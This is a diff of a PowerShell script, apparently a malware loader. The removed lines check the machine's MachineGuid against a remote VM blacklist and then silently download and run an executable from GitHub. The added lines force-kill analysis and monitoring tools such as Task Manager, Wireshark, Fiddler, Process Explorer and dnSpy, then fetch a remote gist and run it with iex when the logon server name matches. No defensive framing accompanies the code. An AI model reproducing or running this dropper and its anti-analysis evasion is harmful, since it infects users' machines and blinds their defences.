@@ -1,23 +1,13 @@
-# Lấy giá trị MachineGuid từ Registry
-$machineGuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
+$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
 
-# URL của file MachineGuid.txt
-$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt"
-
-# Tải nội dung của file MachineGuid.txt
-try {
-    $remoteContent = Invoke-WebRequest -Uri $url -UseBasicParsing
-    $machineGuids = $remoteContent.Content -split "`n" -replace "`r",""
-} catch {
-    Write-Host "Không thể tải tệp từ URL. Kiểm tra kết nối mạng và URL."
-    exit
+foreach ($prg in $2kill) {
+    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
+    if ($rprc) {
+        Stop-Process -Name $prg -Force 
+        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
+    }
 }
 
-# Kiểm tra xem MachineGuid có trong danh sách không
-if ($machineGuids -contains $machineGuid) {
-    Write-Host "MachineGuid có trong danh sách đen."
-} else {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
-    Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
+if ($env:LOGONSERVER -match "DADDYSERVER") {
+    iwr "https://gist.githubusercontent.com/43a1723/ec336f9a82bf70f70d67eb557a4c31ff/raw/39a0af39c66432665097d88960f495d9fe6780ea/skid" | iex
 }
-
